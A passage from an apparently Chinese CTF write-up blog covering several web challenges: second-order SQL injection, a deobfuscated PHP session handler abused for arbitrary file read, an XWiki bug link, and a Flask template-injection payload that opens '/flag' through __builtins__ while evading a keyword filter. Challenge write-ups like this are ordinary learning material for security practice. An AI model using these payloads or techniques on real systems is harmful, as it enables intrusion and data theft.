        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"update `file` set `filename`='{$req['newname']}', `oldname`='{$result['filename']}' where `fid`={$result['fid']}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$re</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$oldname</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">"extension"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$newname</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">"newname"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">"extension"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">,</span> <span class="token variable">$newname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token variable">$newname</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> "Your file is rename<span class="token punctuation">,</span> url<span class="token punctuation">:</span>
                <span class="token markup">&lt;a href=\"{$url}\" target='_blank'></span><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>
                <span class="token markup">&lt;a href=\"/\"></span>go back<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
<span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<p>根据常规做题方法，二次注入的点应该在那个update那里，因为被转义的数据出库了，但是这里加了一个addslashes，而fid不可控，提交的newname吃了一个全局转移<br>但是这里有很奇怪的一步，他先用我们提交的oldname查询了一次，然后又用查询的结果作为文件名再查询一次，而第二次查询出来的结果就是一个没有被转义的注入语句，直接用union联合注入，这样子选出来的数据仍然是$info[‘filename’]，在un.sql文件中已经直接获取了数据库的结构，直接查询就可以获得admin用户名和密码，再upload.php触发反序列化即可<br>（大概是最简单的一个题？我还在看代码的时候师傅就拿了二血了）<br>反序列化要上传文件的同时才能触发（有点无意义但是我被坑了一下下）</p>
<h2 id="babyshop"><a href="#babyshop" class="headerlink" title="babyshop"></a>babyshop</h2><p>点开是一个shop，给了钱，可以买一堆乱七八糟的东西，反正就是买flag的钱不够，有一个note功能可以添加一个签名，没有xss会被转义，一开始想的是获取源码之后可能有一个session反序列化，用note整出一个畸形session文件把钱改到99999之类的。</p>
<p>首先是.git源码泄漏，不知道为什么dirsearch坏了，还是手试试出来的，然后上githack，也坏了不能用，让另一个师傅帮忙下下来的。。。。<br>众多文件均没什么用，唯独一个init.php看得人头痛<br>全中文变量名加不明所以命名法加去除所有缩进的代码堆。第一眼就让人心态爆炸<br>先上网上找个在线工具把缩进加上来。。。但是还是看不懂，有各种各样的奇怪东西</p>
<p>可以先用var_dump(get_defined_vars())看看有什么东西<br>发现定义的几个global变量的值都是一些函数名</p>
<pre class=" language-php"><code class="language-php">  <span class="token string">'寻根'</span> <span class="token operator">=</span><span class="token operator">></span>
  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"strpos"</span>
  <span class="token string">'奇语切片'</span> <span class="token operator">=</span><span class="token operator">></span>
  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string">"str_split"</span>
  <span class="token string">'出窍'</span> <span class="token operator">=</span><span class="token operator">></span>
  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string">"array_pop"</span>
  <span class="token string">'遮天之术'</span> <span class="token operator">=</span><span class="token operator">></span>
  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token string">"base64_decode"</span>
  <span class="token string">'虚空之数'</span> <span class="token operator">=</span><span class="token operator">></span>
  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token string">'实打实在'</span> <span class="token operator">=</span><span class="token operator">></span>
  <span class="token function">bool</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>
  <span class="token string">'虚无缥缈'</span> <span class="token operator">=</span><span class="token operator">></span>
  <span class="token function">bool</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>
</code></pre>
<p>发现这些函数名变量的使用都是动态调用，先全替换掉再说</p>
<p>造化之神类为加密类，定义了一万个乱七八糟的变量，融合函数就计算出了这些奇怪的变量的值，点灯和造化两个函数都是解密函数，可以把加密过的奇怪中文解码成正常一点的东西<br>这些傻逼玩意还是都先同一解码出来的好，写个小脚本完成</p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
init<span class="token punctuation">.</span>php的内容

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"init.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/造化\([^\$].*?\)/"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'$tmp='</span><span class="token punctuation">.</span><span class="token string">"$m"</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$tmp</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"result.php"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>把憨批造化全部替换成正常一点的东西，双手造物就是一个动态调用。测获赋这三个倒是很好理解，就是isset,get,set<br>还顺便把变量名改成了英文的。。。。全中文代码看起来就是怪怪的</p>
<p>第二个类造轮子，倒是很容易从名字上理解，重写的一个session的行为类，通过改造完的代码，看见了session_set_save_handler，然后把轮子类的一堆方法作为回调函数传了进去<br>顺便按照回调函数的名字把函数名字改了，整理完的代码看起来舒服多了</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function">is_set</span><span class="token punctuation">(</span>$内<span class="token punctuation">,</span> $容<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">global</span> $<span class="token punctuation">{</span>$内<span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">isset</span><span class="token punctuation">(</span>$<span class="token punctuation">{</span>$内<span class="token punctuation">}</span><span class="token punctuation">[</span>$容<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span>$内<span class="token punctuation">,</span> $容<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">global</span> $<span class="token punctuation">{</span>$内<span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> @$<span class="token punctuation">{</span>$内<span class="token punctuation">}</span><span class="token punctuation">[</span>$容<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span>$内<span class="token punctuation">,</span> $容<span class="token punctuation">,</span> $值<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">global</span> $<span class="token punctuation">{</span>$内<span class="token punctuation">}</span><span class="token punctuation">;</span>
    $<span class="token punctuation">{</span>$内<span class="token punctuation">}</span><span class="token punctuation">[</span>$容<span class="token punctuation">]</span> <span class="token operator">=</span> $值<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">CreateWheel</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$path</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$save_path</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$forbiden</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token string">"storage"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">forbiden</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$savePath</span><span class="token punctuation">,</span> <span class="token variable">$sessionName</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">forbiden</span> <span class="token keyword">as</span> <span class="token variable">$element</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"_COOKIE"</span><span class="token punctuation">,</span> <span class="token variable">$sessionName</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$element</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"invaild "</span>  <span class="token punctuation">.</span> <span class="token variable">$sessionName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">save_path</span> <span class="token operator">=</span> <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$sess_value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token punctuation">.</span> <span class="token string">"/sess_"</span> <span class="token punctuation">.</span> <span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$sess_value</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token variable">$sessionID</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token variable">$sessionID</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token punctuation">.</span> <span class="token string">"/sess_"</span> <span class="token punctuation">.</span> <span class="token variable">$sessionID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$sessionID</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">save_path</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token punctuation">.</span> <span class="token string">"/note_"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">save_path</span><span class="token punctuation">,</span> <span class="token variable">$sessionID</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token punctuation">.</span> <span class="token string">"/note_"</span><span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> 思考<span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token punctuation">.</span> <span class="token string">"/sess_"</span> <span class="token punctuation">.</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token punctuation">.</span> <span class="token string">"/sess_"</span> <span class="token punctuation">.</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> 反省<span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token punctuation">.</span> <span class="token string">'/*'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$element</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$element</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$path</span> <span class="token operator">&lt;</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$element</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$element</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>

        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$wheel</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CreateWheel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_set_save_handler</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$wheel</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$wheel</span><span class="token punctuation">,</span> <span class="token string">'close'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$wheel</span><span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$wheel</span><span class="token punctuation">,</span> <span class="token string">'write'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$wheel</span><span class="token punctuation">,</span> <span class="token string">'destroy'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$wheel</span><span class="token punctuation">,</span> <span class="token string">'gc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">mktime</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> 化缘<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"_SESSION"</span><span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> 取经<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">global</span> $盛世<span class="token punctuation">;</span>
    <span class="token variable">$list</span> <span class="token operator">=</span> <span class="token string">"["</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"_SESSION"</span><span class="token punctuation">,</span> <span class="token string">"items"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$element</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$list</span> <span class="token punctuation">.</span><span class="token operator">=</span> $盛世<span class="token punctuation">[</span><span class="token variable">$element</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">', '</span> <span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$list</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"]"</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$list</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> 念经<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">global</span> <span class="token variable">$wheel</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$wheel</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> 造世<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">global</span> $盛世<span class="token punctuation">;</span>
    $宝藏 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span>$盛世 <span class="token keyword">as</span> $按键 <span class="token operator">=</span><span class="token operator">></span> $元素<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        $宝藏 <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;div class="item">&lt;form method="POST">&lt;div class="form-group"> . $元素[0] . &lt;/div>&lt;div class="form-group">&lt;input type="hidden" name="id" value=" . $按键 . ">&lt;button type="submit" class="btn btn-success">buy ($ . $元素[1] . )&lt;/button>&lt;/div>&lt;/form>&lt;/div>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> $宝藏<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>翻了翻这几个函数的原型， read和write都接受的是session的值，完全可控，结果就是read和destroy是任意文件读取，而使用session的时候经过read函数，将$this-&gt;path赋值为我们可控的路径，调用念经函数，return $wheel-&gt;destroy();，destroy的path已经被赋值为路径，读取出flag</p>
<h2 id="XWiki"><a href="#XWiki" class="headerlink" title="XWiki"></a>XWiki</h2><p>用的XWiki框架，一开始看是个Java题就放弃了，结果有现成的payload直接打，后来师傅们出了我也没看后面怎么获取flag<br><a href="https://jira.xwiki.org/browse/XWIKI-16960">https://jira.xwiki.org/browse/XWIKI-16960</a></p>
<h2 id="SimpleFlask"><a href="#SimpleFlask" class="headerlink" title="SimpleFlask"></a>SimpleFlask</h2><p>没看的题，得到的知识点是ssti在拼接字符串的时候不需要加号也能把字符串拼起来，好像是过滤了getattr，空格加号之类的，就防止RCE，但是字符串拼接不需要加号也行（不是很懂<br>payload<code>joiner.__init__.__globals__[&quot;__builtins__&quot;][&quot;open&quot;](&quot;/fl&quot;&quot;ag&quot;).read()</code></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ssti</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>[GKCTF2020]EzNode</title>
    <url>/%5BGKCTF2020%5DEzNode.html</url>
    <content><![CDATA[<h1 id="GKCTF2020-EzNode"><a href="#GKCTF2020-EzNode" class="headerlink" title="[GKCTF2020]EzNode"></a>[GKCTF2020]EzNode</h1><p>也不ez吧，学习了一下nodeJS的中间件概念和next函数</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> saferEval <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'safer-eval'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 2019.7/WORKER1 找到一个很棒的库</span>

<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 2020.1/WORKER2 老板说为了后期方便优化</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>path <span class="token operator">===</span> <span class="token string">'/eval'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
